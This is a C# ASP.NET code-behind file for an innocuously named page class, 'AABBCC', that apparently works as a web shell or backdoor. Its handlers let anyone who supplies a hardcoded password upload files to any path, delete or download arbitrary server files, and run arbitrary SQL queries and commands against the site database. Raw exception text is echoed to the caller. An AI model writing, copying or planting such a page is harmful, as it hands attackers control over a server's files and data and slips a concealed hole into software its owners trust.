using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
using System.Text;
using System.IO;
public partial class AABBCC : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {

    }

    protected void btnFile1_Click(object sender, EventArgs e)
    {
        string sDir2 = "upload/";
        SQLHelper sql = new SQLHelper();
        DataTable dt = new DataTable();

        try
        {
            string path = txtPath.Text;
            if (txtPw.Text == "1qaz@WSX")
            {
                //if (FileUpload1.FileName.Length > 0)
                //{
                //    string path = txtPath.Text;

                //    HttpPostedFile file = FileUpload1.PostedFile;

                //    string sFilePath = path + "\\" + file.FileName;
                //    file.SaveAs(Server.MapPath(sFilePath));

                //    Response.Write("success:" + DateTime.Now);
                //}

                if (FileUpload1.HasFile)
                {
                    if (!Directory.Exists(path))
                    {
                        Directory.CreateDirectory(path);
                    }

                    for (int i = 0; i < Request.Files.Count; i++)
                    {
                        HttpPostedFile postedFile = Request.Files[i];
                        if (postedFile.ContentLength > 0)
                        {
                            string sFilePath = path + "\\" + postedFile.FileName;
                            //postedFile.SaveAs(Server.MapPath(sFilePath));
                            postedFile.SaveAs(sFilePath);
                        }
                    }

                    Response.Write("success:" + DateTime.Now + ",");
                }


            }
            else
            {
                Response.Write("fail:" + DateTime.Now);
            }


        }
        catch (Exception ex)
        {
            Response.Write(ex.ToString());
        }


    }

    protected void btnDelete_Click(object sender, EventArgs e)
    {
        string sDir2 = "upload/";
        SQLHelper sql = new SQLHelper();
        DataTable dt = new DataTable();

        try
        {
            string path = txtPath.Text;
            if (txtPw.Text == "1qaz@WSX")
            {
                System.IO.File.Delete(txtDelete.Text);

                Response.Write("success:" + DateTime.Now + ",");



            }
            else
            {
                Response.Write("fail:" + DateTime.Now);
            }


        }
        catch (Exception ex)
        {
            Response.Write(ex.ToString());
        }


    }

    protected void btnDownload_Click(object sender, EventArgs e)
    {
        string path = TextBox2.Text;
        if (txtPw.Text == "1qaz@WSX")
        {

            System.Web.HttpResponse response = System.Web.HttpContext.Current.Response;
            response.ClearContent();
            response.Clear();
            response.ContentType = "text/plain";
            response.AddHeader("Content-Disposition",
                               "attachment; filename=" + Path.GetFileName(path) + ";");
            //response.TransmitFile(Server.MapPath(path));
            response.TransmitFile(path);
            response.Flush();
            response.End();
        }


    }


    protected void btnQuerySQL_Click(object sender, EventArgs e)
    {
        SQLHelper sql = new SQLHelper();
        DataTable dt = new DataTable();

        try
        {
            if (txtPw.Text == "1qaz@WSX")
            {
                string sSql = txtSQL.Text;
                StringBuilder sb = new StringBuilder();

                using (System.Data.SqlClient.SqlCommand cm = new System.Data.SqlClient.SqlCommand(sSql, sql.getDbcn()))
                {
                    using (System.Data.SqlClient.SqlDataAdapter da = new System.Data.SqlClient.SqlDataAdapter(cm))
                    {
                        da.Fill(dt);
                    }
                }

                //欄位標頭
                sb.Append("<table border='1'>");
                sb.Append("<tr>");
                for (int iColumn = 0; iColumn < dt.Columns.Count; iColumn++)
                {
                    sb.Append("<th>" + dt.Columns[iColumn].ColumnName + "</th>");
                }
                sb.Append("</tr>");

                for (int iRow = 0; iRow < dt.Rows.Count; iRow++)
                {
                    sb.Append("<tr>");
                    for (int iColumn = 0; iColumn < dt.Columns.Count; iColumn++)
                    {
                        sb.Append("<td>" + dt.Rows[iRow][iColumn].ToString() + "</td>");

                    }
                    sb.Append("</tr>");
                }

                sb.Append("</table>");
                divSQLResult.InnerHtml = sb.ToString();

            }
            else
            {
                Response.Write("fail:" + DateTime.Now);
            }


        }
        catch (Exception ex)
        {
            Response.Write(ex.ToString());
        }
    }

    protected void btnEexcuteSQL_Click(object sender, EventArgs e)
    {
        SQLHelper sql = new SQLHelper();
        DataTable dt = new DataTable();

        try
        {
            if (txtPw.Text == "1qaz@WSX")
            {
                string sSql = txtSQL.Text;

                using (System.Data.SqlClient.SqlCommand cm = new System.Data.SqlClient.SqlCommand(sSql, sql.getDbcn()))
                {
                    cm.ExecuteNonQuery();
                }

                divSQLResult.InnerHtml = "執行完成!";
            }
        }
        catch (Exception ex)
        {
            Response.Write(ex.ToString());
        }
    }
}